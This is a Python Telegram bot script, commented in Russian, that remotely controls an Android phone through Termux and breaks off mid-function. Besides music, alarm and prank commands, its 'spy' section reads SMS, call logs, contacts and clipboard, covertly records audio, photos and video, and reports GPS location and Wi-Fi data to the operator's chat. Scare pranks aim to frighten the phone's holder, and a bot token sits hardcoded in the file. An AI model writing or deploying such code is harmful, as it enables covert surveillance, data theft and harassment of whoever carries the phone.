import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton
import subprocess, os, json, time, signal, threading, random
from datetime import datetime

TOKEN = '8733717882:AAFyHqQpFBFVKLOgB6w1WRxqx7_DX9xxg6I'
ADMIN_ID = 6678107119
PULT_URL = 'https://raw.githack.com/ggfix666-prog/a51-sc-control/main/prank.html'

bot = telebot.TeleBot(TOKEN)
current_process = None
PAUSED = False
ALARM_VIBRATE = False
ALARM_THREADS = {}  # {id: {"stop": False, ...}}
ALARMS_FILE = '/sdcard/Download/alarms.json'

def is_admin(m): return m.from_user.id == ADMIN_ID

@bot.message_handler(func=lambda m: not is_admin(m), content_types=['text'])
def deny(m): bot.reply_to(m, "⛔ Доступ запрещён.")

def prank_kb():
    m = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    m.add(KeyboardButton("🎮 Пульт", web_app=WebAppInfo(url=PULT_URL)))
    return m

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message,
        "🤖 <b>A51 Control</b>\n\n"
        "🎵 <b>МУЗЫКА</b>\n"
        "/list /play /stop /volume 50 /loud\n\n"
        "🔧 <b>СИСТЕМА</b>\n"
        "/say /torch on|off /flash 5 /fakecall 15\n"
        "/vibrate 5 /battery /photo /selfie\n"
        "/burst 5 /sburst 5 /video 10 /selfievideo 10\n"
        "/location /clip /brightness 50 /notify\n"
        "/device /silent /open\n\n"
        "🕵️ <b>ШПИОН</b>\n"
        "/sms /calls /contacts /record 10\n"
        "/wifi /wifiscan /toast\n\n"
        "🎭 <b>ПРАНК</b>\n"
        "/prank /ghost /insane\n\n"
        "⏰ <b>БУДИЛЬНИКИ</b>\n"
        "/alarm ЧЧ:ММ трек.mp3 10 — свой будильник\n"
        "/alarms — список активных\n"
        "/alarm_stop — остановить все\n"
        "/alarm_vibrate on|off\n"
        "/samsung_alarm ЧЧ:ММ — системный будильник\n\n"
        "⏻ <b>УПРАВЛЕНИЕ БОТОМ</b>\n"
        "/botoff /boton\n\n"
        "Открой «🎮 Пульт» внизу 👇",
        parse_mode='HTML', reply_markup=prank_kb())

# ── KILL SWITCH ──
@bot.message_handler(commands=['botoff'])
def botoff_cmd(message):
    global PAUSED
    PAUSED = True
    bot.reply_to(message, "БОТ ПОЛНОСТЬЮ ВЫКЛЮЧЕН, НЕ РАБОТАЕТ")

@bot.message_handler(commands=['boton'])
def boton_cmd(message):
    global PAUSED
    PAUSED = False
    bot.reply_to(message, "▶️ *Бот снова работает.*\nВсе команды активны.", parse_mode='Markdown')

@bot.message_handler(func=lambda m: PAUSED and m.text and not m.text.startswith('/boton') and not m.text.startswith('/botoff') and not m.text.startswith('/start'))
def kill_all(message):
    bot.reply_to(message, "БОТ ПОЛНОСТЬЮ ВЫКЛЮЧЕН, НЕ РАБОТАЕТ")

# ── ФОНАРИК-МИГАНИЕ ──
@bot.message_handler(commands=['flash'])
def flash_cmd(message):
    p = message.text.split()
    n = int(p[1]) if len(p) > 1 and p[1].isdigit() else 5
    n = min(n, 100)
    bot.reply_to(message, f"🔦 Мигаю {n} раз...")
    def _do():
        for i in range(n):
            try:
                subprocess.run(["termux-torch", "on"], check=True)
                time.sleep(0.15)
                subprocess.run(["termux-torch", "off"], check=True)
                time.sleep(0.15)
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ {e}")
                return
        bot.send_message(message.chat.id, f"✅ Мигнул {n} раз")
    threading.Thread(target=_do, daemon=True).start()

# ── ИМИТАЦИЯ ЗВОНКА ──
@bot.message_handler(commands=['fakecall'])
def fakecall_cmd(message):
    p = message.text.split()
    sec = int(p[1]) if len(p) > 1 and p[1].isdigit() else 15
    sec = min(sec, 120)
    bot.reply_to(message, f"📞 Имитирую звонок {sec} сек...")
    def _do():
        try:
            subprocess.run([
                "termux-notification", "--title", "☎️ Входящий вызов",
                "--content", "Неизвестный номер", "--sound", "--priority", "max",
                "--id", "777",
                "--button1", "Ответить", "--button1-action", "termux-toast 'Ответил'",
                "--button2", "Отклонить", "--button2-action", "termux-notification-remove 777"
            ], check=True)
            end_time = time.time() + sec
            while time.time() < end_time:
                subprocess.run(["termux-vibrate", "-d", "2000"])
                time.sleep(3)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ {e}"); return
        subprocess.run(["termux-notification-remove", "777"])
        bot.send_message(message.chat.id, "✅ Звонок завершён")
    threading.Thread(target=_do, daemon=True).start()

# ── LOUD ──
@bot.message_handler(commands=['loud'])
def loud_cmd(message):
    bot.reply_to(message, "🔊 Громкость максимум...")
    try:
        subprocess.run(["termux-volume", "music", "15"], check=True)
        bot.send_message(message.chat.id, "✅ Громкость на максимум")
    except Exception as e: bot.reply_to(message, f"❌ {e}")

# ── МУЗЫКА ──
MUSIC_DIR = '/sdcard/Music'

@bot.message_handler(commands=['list'])
def list_cmd(message):
    if not os.path.exists(MUSIC_DIR):
        bot.reply_to(message, "📭 Нет папки"); return
    files = sorted([f for f in os.listdir(MUSIC_DIR) if f.lower().endswith(('.mp3','.m4a','.wav','.ogg'))])
    if not files: bot.reply_to(message, "📭 Пусто"); return
    bot.reply_to(message, "🎵 Треки:\n" + "\n".join(files[:50]))

@bot.message_handler(commands=['play'])
def play_cmd(message):
    global current_process
    fn = message.text.replace('/play','').strip()
    if not fn: bot.reply_to(message, "Напиши: /play имя.mp3"); return
    p = os.path.join(MUSIC_DIR, fn)
    if not os.path.exists(p) and os.path.exists(p+'.mp3'): p += '.mp3'
    if not os.path.exists(p): bot.reply_to(message, f"❌ {fn}"); return
    if current_process and current_process.poll() is None:
        current_process.terminate()
    try:
        current_process = subprocess.Popen(["mpv","--no-video","--really-quiet",p],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        bot.reply_to(message, f"▶️ {fn}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global current_process
    subprocess.run(["pkill","-9","mpv"], stderr=subprocess.DEVNULL)
    current_process = None
    bot.reply_to(message, "⏹ Стоп.")

@bot.message_handler(commands=['volume'])
def vol_cmd(message):
    p = message.text.split()
    if len(p)<2 or not p[1].isdigit(): bot.reply_to(message, "Напиши: /volume 50"); return
    try:
        subprocess.run(["termux-volume","music",str(int(int(p[1])/100*15))], check=True)
        bot.reply_to(message, f"🔊 {p[1]}%")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

# ── СИСТЕМА ──
@bot.message_handler(commands=['say'])
def say_cmd(message):
    t = message.text.replace('/say','').strip()
    if not t: bot.reply_to(message, "Напиши: /say Привет"); return
    try:
        subprocess.run(["termux-tts-speak", t], check=True)
        bot.reply_to(message, f"🗣️ {t}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['torch'])
def torch_cmd(message):
    p = message.text.split()
    if len(p)<2 or p[1].lower() not in ['on','off']:
        bot.reply_to(message, "Напиши: /torch on или /torch off"); return
    try:
        subprocess.run(["termux-torch", p[1].lower()], check=True)
        bot.reply_to(message, f"🔦 {p[1].upper()}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['vibrate'])
def vibrate_cmd(message):
    p = message.text.split()
    if len(p)<2 or not p[1].isdigit(): bot.reply_to(message, "Напиши: /vibrate 5"); return
    try:
        subprocess.run(["termux-vibrate","-d",str(int(p[1])*1000)], check=True)
        bot.reply_to(message, f"📳 {p[1]} сек.")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['battery'])
def battery_cmd(message):
    try:
        r = subprocess.run(["termux-battery-status"], capture_output=True, text=True, check=True)
        d = json.loads(r.stdout)
        bot.reply_to(message, f"🔋 {d.get('percentage')}% • {d.get('status')} • {d.get('temperature')}°C")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['photo'])
def photo_cmd(message):
    bot.reply_to(message, "📸"); p = "/sdcard/Download/a51_photo.jpg"
    try:
        subprocess.run(["termux-camera-photo","-c","0",p], check=True, timeout=15)
        if os.path.exists(p):
            with open(p,'rb') as f: bot.send_photo(message.chat.id, f)
            os.remove(p)
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['selfie'])
def selfie_cmd(message):
    bot.reply_to(message, "🤳"); p = "/sdcard/Download/a51_selfie.jpg"
    try:
        subprocess.run(["termux-camera-photo","-c","1",p], check=True, timeout=15)
        if os.path.exists(p):
            with open(p,'rb') as f: bot.send_photo(message.chat.id, f)
            os.remove(p)
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['location'])
def loc_cmd(message):
    bot.reply_to(message, "📍...")
    try:
        r = subprocess.run(["termux-location","-p","gps"], capture_output=True, text=True, check=True, timeout=20)
        d = json.loads(r.stdout)
        lat, lon = d.get('latitude'), d.get('longitude')
        bot.reply_to(message, f"📍 {lat}, {lon}\nhttps://maps.google.com/?q={lat},{lon}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['clip'])
def clip_cmd(message):
    try:
        r = subprocess.run(["termux-clipboard-get"], capture_output=True, text=True, check=True)
        bot.reply_to(message, f"📋 {r.stdout.strip() or 'Пусто'}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['brightness'])
def bright_cmd(message):
    p = message.text.split()
    if len(p)<2 or not p[1].isdigit(): bot.reply_to(message, "Напиши: /brightness 50"); return
    try:
        subprocess.run(["termux-brightness", str(int(int(p[1])/100*255))], check=True)
        bot.reply_to(message, f"💡 {p[1]}%")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['notify'])
def notify_cmd(message):
    t = message.text.replace('/notify','').strip()
    if not t: bot.reply_to(message, "Напиши: /notify Текст"); return
    try:
        subprocess.run(["termux-notification","--title","A51","--content",t], check=True)
        bot.reply_to(message, f"🔔 {t}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['device'])
def device_cmd(message):
    try:
        m = subprocess.run(["getprop","ro.product.model"], capture_output=True, text=True).stdout.strip()
        a = subprocess.run(["getprop","ro.build.version.release"], capture_output=True, text=True).stdout.strip()
        bot.reply_to(message, f"📱 {m}\nAndroid: {a}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['silent'])
def silent_cmd(message):
    try:
        subprocess.run(["termux-volume","notification","0"], check=True)
        bot.reply_to(message, "🔇 Беззвучный.")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['open'])
def open_cmd(message):
    u = message.text.replace('/open','').strip()
    if not u: bot.reply_to(message, "Напиши: /open https://..."); return
    try:
        subprocess.run([
            "termux-notification", "--title", "🌐 Открыть ссылку",
            "--content", u[:100], "--button1", "Открыть",
            "--button1-action", f"termux-open '{u}'", "--id", "99"
        ], check=True)
        bot.reply_to(message, "🔔 Потяни шторку и нажми «Открыть»")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

# ── ШПИОН ──
@bot.message_handler(commands=['sms'])
def sms_cmd(message):
    try:
        r = subprocess.run(["termux-sms-list","-l","5"], capture_output=True, text=True, check=True)
        d = json.loads(r.stdout)
        if not d: bot.reply_to(message, "SMS нет."); return
        t = "📩 SMS:\n\n"
        for s in d: t += f"📱 {s.get('number')}\n{s.get('body')}\n\n"
        bot.reply_to(message, t)
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['calls'])
def calls_cmd(message):
    try:
        r = subprocess.run(["termux-call-log","-l","5"], capture_output=True, text=True, check=True)
        d = json.loads(r.stdout)
        if not d: bot.reply_to(message, "Звонков нет."); return
        t = "📞 Звонки:\n\n"
        for c in d: t += f"📱 {c.get('name')} ({c.get('phone_number')})\n{c.get('type')} — {c.get('duration')} сек.\n\n"
        bot.reply_to(message, t)
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['contacts'])
def contacts_cmd(message):
    try:
        r = subprocess.run(["termux-contact-list"], capture_output=True, text=True, check=True)
        d = json.loads(r.stdout)
        if not d: bot.reply_to(message, "Контактов нет."); return
        t = f"👥 {len(d)} шт. Первые 10:\n\n"
        for c in d[:10]: t += f"📱 {c.get('name')} — {c.get('number')}\n"
        bot.reply_to(message, t)
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['record'])
def record_cmd(message):
    p = message.text.split()
    sec = int(p[1]) if len(p)>1 and p[1].isdigit() else 5
    if sec > 60: sec = 60
    bot.reply_to(message, f"🎤 {sec} сек...")
    path = "/sdcard/Download/a51_record.m4a"
    def _do():
        try:
            subprocess.Popen(["termux-microphone-record","-f",path,"-l",str(sec)])
            time.sleep(sec+2)
            subprocess.run(["termux-microphone-record","-q"])
            if os.path.exists(path):
                with open(path,'rb') as f: bot.send_voice(message.chat.id, f)
                os.remove(path)
        except Exception as e: bot.reply_to(message, f"Ошибка: {e}")
    threading.Thread(target=_do, daemon=True).start()

def _record_video(message, cam_index, sec, label):
    frames_dir = "/sdcard/Download/a51_frames"
    out_path   = "/sdcard/Download/a51_video.mp4"
    def _do():
        try:
            os.makedirs(frames_dir, exist_ok=True)
            subprocess.run(f"rm -f {frames_dir}/*.jpg", shell=True)
            bot.send_message(message.chat.id, f"📷 Снимаю кадры {sec} сек...")
            n = 0
            deadline = time.time() + sec
            while time.time() < deadline:
                frame = f"{frames_dir}/f{n:04d}.jpg"
                subprocess.run(["termux-camera-photo","-c",str(cam_index),frame],
                    capture_output=True, timeout=10)
                if os.path.exists(frame): n += 1
            if n < 2:
                bot.reply_to(message, "❌ Меньше 2 кадров."); return
            subprocess.run([
                "ffmpeg","-y","-framerate","2",
                "-i", f"{frames_dir}/f%04d.jpg",
                "-c:v","libx264","-pix_fmt","yuv420p",
                "-vf","scale=1280:-2", out_path
            ], capture_output=True, timeout=120)
            if os.path.exists(out_path) and os.path.getsize(out_path) > 500:
                with open(out_path,'rb') as f:
                    bot.send_video(message.chat.id, f, caption=f"{label} ({n} кадров)")
                os.remove(out_path)
            else:
                bot.reply_to(message, "❌ ffmpeg не склеил.")
            subprocess.run(f"rm -rf {frames_dir}", shell=True)
        except Exception as e:
            bot.reply_to(message, f"❌ {e}")
    threading.Thread(target=_do, daemon=True).start()

@bot.message_handler(commands=['burst'])
def burst_cmd(message):
    p = message.text.split()
    n = int(p[1]) if len(p) > 1 and p[1].isdigit() else 5
    n = min(n, 20)
    bot.reply_to(message, f"📸 {n} фото...")
    def _do():
        sent = 0
        for i in range(n):
            path = f"/sdcard/Download/burst_{i}.jpg"
            try:
                subprocess.run(["termux-camera-photo","-c","0",path], capture_output=True, timeout=10)
                if os.path.exists(path):
                    with open(path,'rb') as f:
                        bot.send_photo(message.chat.id, f)
                    os.remove(path); sent += 1
            except: pass
        bot.send_message(message.chat.id, f"✅ {sent}/{n}")
    threading.Thread(target=_do, daemon=True).start()

@bot.message_handler(commands=['sburst'])
def sburst_cmd(message):
    p = message.text.split()
    n = int(p[1]) if len(p) > 1 and p[1].isdigit() else 5
    n = min(n, 20)
    bot.reply_to(message, f"🤳 {n} селфи...")
    def _do():
        sent = 0
        for i in range(n):
            path = f"/sdcard/Download/sburst_{i}.jpg"
            try:
                subprocess.run(["termux-camera-photo","-c","1",path], capture_output=True, timeout=10)
                if os.path.exists(path):
                    with open(path,'rb') as f:
                        bot.send_photo(message.chat.id, f)
                    os.remove(path); sent += 1
            except: pass
        bot.send_message(message.chat.id, f"✅ {sent}/{n}")
    threading.Thread(target=_do, daemon=True).start()

@bot.message_handler(commands=['video'])
def video_cmd(message):
    p = message.text.split()
    sec = max(1, min(int(p[1]) if len(p)>1 and p[1].isdigit() else 10, 30))
    bot.reply_to(message, f"🎥 {sec} сек (задняя)...")
    _record_video(message, 0, sec, "📹 Задняя")

@bot.message_handler(commands=['selfievideo'])
def selfievideo_cmd(message):
    p = message.text.split()
    sec = max(1, min(int(p[1]) if len(p)>1 and p[1].isdigit() else 10, 30))
    bot.reply_to(message, f"🤳 {sec} сек (фронт)...")
    _record_video(message, 1, sec, "🤳 Фронт")

@bot.message_handler(commands=['wifi'])
def wifi_cmd(message):
    try:
        r = subprocess.run(["termux-wifi-connectioninfo"], capture_output=True, text=True, check=True)
        d = json.loads(r.stdout)
        bot.reply_to(message, f"📶 {d.get('ssid')}\nIP: {d.get('ip')}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['wifiscan'])
def wifiscan_cmd(message):
    try:
        r = subprocess.run(["termux-wifi-scaninfo"], capture_output=True, text=True, check=True)
        d = json.loads(r.stdout)
        t = f"📡 {len(d)} сетей:\n\n"
        for w in d[:10]: t += f"📶 {w.get('ssid')} ({w.get('rssi')} dBm)\n"
        bot.reply_to(message, t)
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['toast'])
def toast_cmd(message):
    t = message.text.replace('/toast','').strip()
    if not t: bot.reply_to(message, "Напиши: /toast Привет"); return
    try:
        subprocess.run(["termux-toast", t], check=True)
        bot.reply_to(message, f"🎈 {t}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

# ── ПРАНКИ ──
@bot.message_handler(commands=['prank'])
def prank_cmd(message):
    bot.reply_to(message, "🎭 Пранк...")
    acts = [
        lambda: subprocess.run(["termux-vibrate","-d","2000"]),
        lambda: subprocess.run(["termux-toast","Я тебя вижу"]),
        lambda: subprocess.run(["termux-tts-speak","Привет, я твой телефон"]),
        lambda: subprocess.run(["termux-torch","on"]),
    ]
    random.shuffle(acts)
    for a in acts[:3]:
        try: a(); time.sleep(1.5)
        except: pass
    subprocess.run(["termux-torch","off"])
    bot.reply_to(message, "Готово.")

@bot.message_handler(commands=['ghost'])
def ghost_cmd(message):
    bot.reply_to(message, "👻 Призрак...")
    try:
        subprocess.run(["termux-tts-speak","Я здесь. Я вижу тебя."])
        time.sleep(3)
        subprocess.run(["termux-vibrate","-d","1000"]); time.sleep(1)
        subprocess.run(["termux-toast","Не оборачивайся"]); time.sleep(2)
        subprocess.run(["termux-torch","on"]); time.sleep(0.5)
        subprocess.run(["termux-torch","off"])
        bot.reply_to(message, "Ушёл.")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['insane'])
def insane_cmd(message):
    bot.reply_to(message, "🤪 Безумие...")
    try:
        for i in range(5):
            subprocess.run(["termux-vibrate","-d","500"])
            subprocess.run(["termux-toast", random.choice(["Ха-ха","Я живой","Беги","Ты не один","Помогите"])])
            time.sleep(1)
        subprocess.run(["termux-torch","on"]); time.sleep(1)
        subprocess.run(["termux-torch","off"])
        subprocess.run(["termux-tts-speak","Я сошёл с ума. Ха-ха-ха."])
        bot.reply_to(message, "Закончилось.")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

# ═══════════════════════════════════════════
#  БУДИЛЬНИК TERMUX
# ═══════════════════════════════════════════
def load_alarms():
    if not os.path.exists(ALARMS_FILE): return []
    try:
        with open(ALARMS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except: return []

def save_alarms(alarms):
    with open(ALARMS_FILE, 'w', encoding='utf-8') as f:
        json.dump(alarms, f, ensure_ascii=False, indent=2)

def alarm_worker(alarm_id, time_str, track, repeat, vibrate=False):
    """Поток, который ждёт время и играет."""
    while not ALARM_THREADS.get(alarm_id, {}).get('stop'):
        now = datetime.now().strftime("%H:%M")
        if now >= time_str:
            break
        time.sleep(10)
    
    if ALARM_THREADS.get(alarm_id, {}).get('stop'):
        return
    
    subprocess.run(["termux-volume", "music", "15"])
    
    if vibrate:
        try:
            subprocess.Popen(["termux-vibrate", "-d", str(min(repeat, 60) * 30 * 1000)])
        except: pass
    
    for i in range(repeat):
        if ALARM_THREADS.get(alarm_id, {}).get('stop'):
            break
        p = os.path.join(MUSIC_DIR, track) if track else ""
        if not track:
            subprocess.run(["termux-tts-speak", "Будильник"])
            break
        if not os.path.exists(p) and os.path.exists(p + '.mp3'):
            p += '.mp3'
        if not os.path.exists(p):
            subprocess.run(["termux-tts-speak", "Файл не найден"])
            break
        try:
            subprocess.run(["mpv", "--no-video", "--really-quiet", p],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
        except: pass
        time.sleep(3)
    
    ALARM_THREADS.pop(alarm_id, None)

@bot.message_handler(commands=['alarm'])
def alarm_cmd(message):
    parts = message.text.split(maxsplit=3)
    if len(parts) < 2:
        bot.reply_to(message, "Формат: /alarm 07:00 трек.mp3 10")
        return
    time_str = parts[1]
    if not (len(time_str) == 5 and time_str[2] == ':'):
        bot.reply_to(message, "❌ Время в формате ЧЧ:ММ")
        return
    track = parts[2] if len(parts) > 2 else ""
    try:
        repeat = int(parts[3]) if len(parts) > 3 and parts[3].isdigit() else 10
    except: repeat = 10
    repeat = max(1, min(repeat, 100))
    
    alarm_id = str(int(time.time()))
    ALARM_THREADS[alarm_id] = {"stop": False}
    t = threading.Thread(target=alarm_worker,
        args=(alarm_id, time_str, track, repeat, ALARM_VIBRATE), daemon=True)
    t.start()
    
    alarms = load_alarms()
    alarms.append({"id": alarm_id, "time": time_str, "track": track, "repeat": repeat})
    save_alarms(alarms)
    
    bot.reply_to(message, f"⏰ Будильник на {time_str}\n🎵 {track or 'TTS'}\n🔁 {repeat} раз")

@bot.message_handler(commands=['alarms'])
def alarms_list_cmd(message):
    alarms = load_alarms()
    if not alarms:
        bot.reply_to(message, "📭 Нет активных будильников."); return
    t = "⏰ Активные будильники:\n\n"
    for a in alarms:
        t += f"🕐 {a['time']} — {a.get('track','TTS')}\n🔁 {a.get('repeat',10)} раз\n\n"
    bot.reply_to(message, t)

@bot.message_handler(commands=['alarm_stop'])
def alarm_stop_cmd(message):
    for aid, data in list(ALARM_THREADS.items()):
        data['stop'] = True
    ALARM_THREADS.clear()
    subprocess.run(["pkill", "-9", "mpv"], stderr=subprocess.DEVNULL)
    save_alarms([])
    bot.reply_to(message, "⏹ Все будильники остановлены.")

@bot.message_handler(commands=['alarm_vibrate'])
def alarm_vibrate_cmd(message):
    p = message.text.split()
    if len(p) < 2 or p[1].lower() not in ['on','off']:
        bot.reply_to(message, "Формат: /alarm_vibrate on|off"); return
    global ALARM_VIBRATE
    ALARM_VIBRATE = p[1].lower() == 'on'
    bot.reply_to(message, f"📳 Вибрация: {p[1].upper()}")

# ═══════════════════════════════════════════
#  БУДИЛЬНИК SAMSUNG
# ═══════════════════════════════════════════
@bot.message_handler(commands=['samsung_alarm'])
def samsung_alarm_cmd(message):
    p = message.text.split()
    if len(p) < 2:
        bot.reply_to(message, "Формат: /samsung_alarm 07:00"); return
    time_str = p[1]
    try:
        h, m = time_str.split(':'); h, m = int(h), int(m)
        if h < 0 or h > 23 or m < 0 or m > 59: raise ValueError()
    except:
        bot.reply_to(message, "❌ Формат ЧЧ:ММ (00:00 — 23:59)"); return
    
    try:
        subprocess.run([
            "am", "start",
            "-a", "android.intent.action.SET_ALARM",
            "--ei", "android.intent.extra.alarm.HOUR", str(h),
            "--ei", "android.intent.extra.alarm.MINUTES", str(m),
            "--ez", "android.intent.extra.alarm.SKIP_UI", "false"
        ], check=True)
        bot.reply_to(message, f"📱 Открыл будильник Samsung на {time_str}\nНажми «Сохранить».")
    except Exception as e:
        bot.reply_to(message, f"❌ {e}")

# ═══════════════════════════════════════════
#  ОБРАБОТЧИК WEB APP
# ═══════════════════════════════════════════
@bot.message_handler(content_types=['web_app_data'])
def handle_webapp(message):
    raw = message.web_app_data.data.strip()
    print(f"[WEBAPP] {raw[:80]}")
    cmd = raw.split()[0] if raw else ""
    if PAUSED and cmd not in ['/boton', '/botoff', '/start']:
        bot
